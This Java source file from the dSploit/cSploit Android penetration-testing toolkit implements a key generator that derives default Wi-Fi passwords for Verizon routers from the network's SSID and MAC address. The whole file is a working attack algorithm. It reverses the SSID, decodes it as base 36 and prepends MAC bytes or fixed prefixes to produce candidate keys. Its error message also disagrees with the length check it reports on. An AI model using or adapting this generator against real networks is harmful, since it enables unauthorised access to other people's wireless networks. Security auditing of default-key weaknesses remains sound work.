/*
 * This file is part of the dSploit.
 *
 * Copyleft of Simone Margaritelli aka evilsocket <evilsocket@gmail.com>
 *
 * dSploit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * dSploit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with dSploit.  If not, see <http://www.gnu.org/licenses/>.
 */
package org.csploit.android.wifi.algorithms;

import java.util.List;

import org.csploit.android.wifi.Keygen;

public class VerizonKeygen extends Keygen{


  public VerizonKeygen(String ssid, String mac, int level, String enc){
    super(ssid, mac, level, enc);
  }

  @Override
  public List<String> getKeys(){
    if(getSsidName().length() != 5){
      setErrorMessage("Invalid ESSID! It must have 6 characters.");
      return null;
    }
    char[] inverse = new char[5];
    inverse[0] = getSsidName().charAt(4);
    inverse[1] = getSsidName().charAt(3);
    inverse[2] = getSsidName().charAt(2);
    inverse[3] = getSsidName().charAt(1);
    inverse[4] = getSsidName().charAt(0);

    int result = 0;
    try{
      result = Integer.valueOf(String.copyValueOf(inverse), 36);
    } catch(NumberFormatException e){
      setErrorMessage("Error processing this SSID.");
      return null;
    }

    String ssidKey = Integer.toHexString(result).toUpperCase();
    while(ssidKey.length() < 6)
      ssidKey = "0" + ssidKey;
    if(!getMacAddress().equals("")){
      addPassword(getMacAddress().substring(3, 5) + getMacAddress().substring(6, 8) +
        ssidKey);
    } else{
      addPassword("1801" + ssidKey);
      addPassword("1F90" + ssidKey);
    }
    return getResults();
  }
}
